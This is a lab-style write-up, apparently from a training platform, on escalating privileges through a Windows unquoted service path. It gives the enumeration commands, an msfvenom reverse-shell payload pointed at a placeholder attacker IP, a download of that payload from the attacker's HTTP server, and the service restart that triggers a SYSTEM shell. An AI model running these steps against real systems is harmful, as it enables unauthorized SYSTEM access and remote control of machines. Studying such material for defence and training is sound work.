# Unquoted Service Path

### Objective:

- Exploite an Unquoted Service Path to execute a malicious binary with SYSTEM privileges.

### Vulnerability Overview :

- when a windows service path contains **spaces , it is not quoted**

so Windows does not search for it in a single path , it searches like that :

example :

C:\Program.exe

C:\Program Files\Disk.exe

C:\Program Files\Disk service.exe

- so if an attacker could place a malicious executable in one of the earlier searched locations , windows will execute it  istead of the legitimate service binary.

### Required condition:

The attacher must have **write permissions** on one of the directories in the search path.

### Enumeration / Discovery:

- To discover a vulnerable service with Unquoted  Path we can use this command to list the services with there names and paths :

`wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"`

- To list the service configuration :

 `sc qc "THE SERVICE NAME”`

we should observe that the : 

     - The binary contains spaces 

     - No quotes around the binary name .

### Exploitation Steps :

1. **Generate a malicious payload :**
- we can use msfvenom to create a reverse TCP shell :

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_VM_IP LPORT=4446 -f exe-service -o Disk.exe`

![image.png](Unquoted%20Service%20Path/image.png)

1. **Transfer the payload to the target :**      
- we lunch an http server on the attacker machine :         `python3 -m http.server`
- and we downalding the malicious file on the target machine :

 `wget http://ATTACKER_VM_IP:8000/Disk.exe -O Disk.exe`

![image.png](Unquoted%20Service%20Path/image%201.png)

1. **We place the malicious file in the vulnerable path and give it the write permissions to be executed :**
- to move the file :   `move C:\Users\thm-unpriv\Disk.exe C:\MyPrograms\Disk.exe`
- to grant the  permission to everyone to execute the file :  `icacls C:\MyPrograms\Disk.exe /grant Everyone:F`
1. **Trigger the service :**
- we stop the vulnerable service  :    `sc stop "disk sorter enterprise”`
- then we start it again : `sc start "disk sorter enterprise”`

 **!!! while this we should lunch netcat on the attacker vm to get the reverse shell as result :**

![image.png](Unquoted%20Service%20Path/image%202.png)



### Key Takeaways :

While enumerating Windows Services , always verify:

- Service path containing **spaces**.
- Missing quotes around the path.
- **Writable directories** in the service path
- Ability to restart the service
